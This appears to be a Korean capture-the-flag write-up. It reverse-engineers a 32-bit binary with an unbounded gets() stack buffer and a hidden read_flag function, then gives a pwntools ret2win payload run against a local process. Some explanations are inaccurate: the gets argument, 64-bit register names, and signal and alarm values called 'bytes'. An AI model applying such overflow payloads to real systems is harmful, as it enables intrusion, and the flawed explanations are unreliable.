# Exploitation 1 분석

## 어셈블리 분석

### main

```asm
0x80485cf <main+3>     add    esp, -0x80
```

- `add esp, -0x80` → `sub esp, 0x80`
- `esp` 레지스터에 `0x80(128 바이트)` 만큼 감소시켜 스택 공간 확보

```asm
0x80485d2 <main+6>     call   initialize
```

- `initialize` 함수 호출

---

#### initialize

```asm
0x8048572 <initialize>       push   ebp
0x8048573 <initialize+1>     mov    ebp, esp
```

- `push rbp`: **현재 함수가 끝난 뒤, 이전 함수로 정확하게 돌아가기 위한 기준점 저장**
- `mov rbp, rsp`: **새로운 스택 프레임으로 전환**

```asm
0x8048575 <initialize+3>     mov    eax, dword ptr [stdin@@GLIBC_2.0]
```

- `stdin` 전역 심볼 값 분석: `0xf7f9d5c0 (_IO_2_1_stdin_)` ← `0xfbad2088`
- [stdin@@GLIBC_2.0] 심볼 주소 내부에 있는 값: `0xfbad2088` **(stdin 첫 번째 인자 추정)**
- `0xf7f9d5c0 (_IO_2_1_stdin_)` 이 값을 `eax` 레지스터에게 복사함

```asm
0x804857a <initialize+8>     push   0
0x804857c <initialize+10>    push   2
0x804857e <initialize+12>    push   0
0x8048580 <initialize+14>    push   eax
```

- 함수 인자들은 오른쪽부터 차례로 `stack`에 `push`되며, 스택은 주소가 감소하는 방향으로 쌓임.  
- **마지막 `push`된 인자는 `rsp` 위치에 저장**되며, 함수 호출 시 스택 최상단부터 인자를 순서대로 참조함  
- 예: `push 0` → `push eax` 순으로 실행되면, 함수는 `function(0, eax)`으로 호출됨

```asm
0x8048581 <initialize+15>    call   setvbuf@plt
```

- `setvbuf` 함수 호출
> 최종: **setvbuf(0xf7f9d5c0 (_IO_2_1_stdin_), 0, 2, 0);**

```asm
0x8048586 <initialize+20>    add    esp, 0x10 
```

- `setvbuf()` 함수 호출 이후, `add esp, 0x10` 명령어로  
`push`로 쌓았던 **4개의 함수 인자(16바이트)를 `stack`에서 정리**함

```asm
0x8048589 <initialize+23>    mov    eax, dword ptr [stdout@@GLIBC_2.0]
```

- `stdin` 전역 심볼 값 분석: `0xf7f9dd40 (_IO_2_1_stdout_)` ◂— `0xfbad2084`
- [stdout@@GLIBC_2.0] 심볼 주소 내부에 있는 값: `0xfbad2084` **(stdout 첫 번째 인자 추정)**
- `0xf7f9dd40 (_IO_2_1_stdout_)` 이 값을 `eax` 레지스터에게 복사함

```asm
0x804858e <initialize+28>    push   0
0x8048590 <initialize+30>    push   2
0x8048592 <initialize+32>    push   0
0x8048594 <initialize+34>    push   eax
```
- **위와 동일**

```asm
0x8048595 <initialize+35>    call   setvbuf@plt
```

- `setvbuf` 함수 호출
> 최종: **setvbuf(0xf7f9dd40 (_IO_2_1_stdout_), 0, 2, 0);**

```asm
0x804859a <initialize+40>    add    esp, 0x10
```

- `setvbuf()` 함수 호출 이후, `add esp, 0x10` 명령어로  
`push`로 쌓았던 **4개의 함수 인자(16바이트)를 `stack`에서 정리**함

```asm
0x804859d <initialize+43>    push   alarm_handler
```

- `alarm_handler` 함수의 주소(함수 포인터)를 `stack`에 저장
- `signal` 콜백 함수로 추정

```asm
0x80485a2 <initialize+48>    push   0xe
```

- `0xe(14 바이트)`를 `stack`에 저장
- 첫 번째 인자 유추 가능

```asm
0x80485a4 <initialize+50>    call   signal@plt
```

- `signal` 함수 호출
> 최종: **signal(0xe, alarm_handler);**

```asm
0x80485a9 <initialize+55>    add    esp, 8
```

- `signal()` 함수 호출 이후, `add esp, 8` 명령어로  
`push`로 쌓았던 **2개의 함수 인자(8바이트)를 `stack`에서 정리**함

```asm
0x80485ac <initialize+58>    push   0x1e
```

- `stack` 에 `0x1e(30 바이트)` 를 저장

```asm
0x80485ae <initialize+60>    call   alarm@plt
```

- `alarm` 함수 호출
> 최종: **alarm(0x1e);**

```asm
0x80485b3 <initialize+65>    add    esp, 4
```

- `alarm()` 함수 호출 이후, `add esp, 4` 명령어로  
`push`로 쌓았던 **1개의 함수 인자(4바이트)를 `stack`에서 정리**함

```asm
0x80485b6 <initialize+68>    nop    
0x80485b7 <initialize+69>    leave  
0x80485b8 <initialize+70>    ret 
```

- `nop → leave → ret` : 함수 종료 절차로, 스택 프레임 정리 및 원래 호출 지점 복귀 수행

#### initialize 함수 c언어 추측

```c
void initialize() {
    setvbuf(0xf7f9d5c0 (_IO_2_1_stdin_), 0(NULL), 2, 0);
    setvbuf(0xf7f9dd40 (_IO_2_1_stdout_), 0(NULL), 2, 0);
    signal(0xe(14), alarm_handler);
    alarm(0x1e(30));
}
```

> **위 코드는 실제 소스코드를 보지 않고, 리버싱 분석만으로 추정한 C 코드입니다.**

---

### main

```asm
0x80485d7 <main+11>          lea    eax, [ebp - 0x80]
```

- `ebp` 레지스터의 값: `0xffffcf38`
- `[ebp - 0x80]` 연산 수행 → `0xffffcf38` - `0x80` = `0xffffceb8`
- `0xffffceb8` 주소안의 값 분석: `0x00000001f7fbf720`
- `0x00000001f7fbf720` 주소값이 나옴, 이 주소 값도 분석: `0x0d696910080482fb` → **0x0d696910080482fb: "GLIBC_2.0"** 
- `0x0d696910080482fb` 값을 `eax` 레지스터 에게 로드

```asm
0x80485da <main+14>          push   eax
```

- 방금 로드 받은 `0x0d696910080482fb` 값을 `stack`에 푸쉬

```asm
0x80485db <main+15>          call   gets@plt
```

- `gets` 함수 호출
> 최종: **gets(0x0d696910080482fb);**

```asm
0x80485e0 <main+20>          add    esp, 4
```

- `gets()` 함수 호출 이후, `add esp, 4` 명령어로  
`push`로 쌓았던 **1개의 함수 인자(4바이트)를 `stack`에서 정리**함

```asm
0x80485e3  <main+23>          mov    eax, 0               
0x80485e8  <main+28>          leave  
0x80485e9  <main+29>          ret
```

- `eax`에 리턴 값 `0` 설정 후, `leave → ret`를 통해 스택 프레임 정리 및 호출한 함수로 복귀
→ **main 함수 종료**

#### 최종 main 함수 추측

```c
int main() {
    char buf[0x80]; // [ebp - 0x80] == buf 변수 추측 → 바이트 & 패딩 값 포함
    initialize();
    gets(buf);
    return 0;
}
```

> **위 코드는 실제 소스코드를 보지 않고, 리버싱 분석만으로 추정한 C 코드입니다.**

## 문제 분석

- `info functions` 명령어 입력 후 수상한 함수(`read_flag`) 발견
- `read_flag` 메모리 추출 후 `disas`로 함수 로직 분석
```asm
Dump of assembler code for function read_flag:
   0x080485b9 <+0>:     push   ebp
   0x080485ba <+1>:     mov    ebp,esp
   0x080485bc <+3>:     push   0x8048679
   0x080485c1 <+8>:     call   0x8048410 <system@plt>
   0x080485c6 <+13>:    add    esp,0x4
   0x080485c9 <+16>:    nop
   0x080485ca <+17>:    leave
   0x080485cb <+18>:    ret
```

- `0x8048679` 주소 분석: **0x8048679: "cat flag"**
- `system` 함수 호출 → `cat flag` 실행 유추

## 결론

### 구조 분석

- `main` 함수에서 **입력 길이 제한이 없는 `gets()`** 함수 사용

- `gets()` 함수의 인자인 `buf` 변수는 **0x80(128 바이트)** 크기의 스택 버퍼

- 따라서 **128 바이트를 초과하는 입력 시, `saved EBP`와 `eip`까지 덮을 수 있는 심각한 버퍼 오버플로우(Buffer Overflow) 취약점** 존재

- `info functions` 명령어로 심볼 테이블 확인한 결과,
**`main()`에서 호출되지 않는 의심스러운 함수(read_flag 등)** 존재

### 분석 환경

- Ubuntu 16.04
- Arch:     i386-32-little
- RELRO:    No RELRO
- Stack:    No canary found
- NX:       NX enabled
- PIE:      No PIE (0x8048000)

### 파이썬 스크립트

```python
from pwn import *

p = process("./exploitation_01")

payload = b'A' * 0x80 + b'B' * 4 + p32(0x080485bc)

p.sendline(payload)
p.interactive()
```

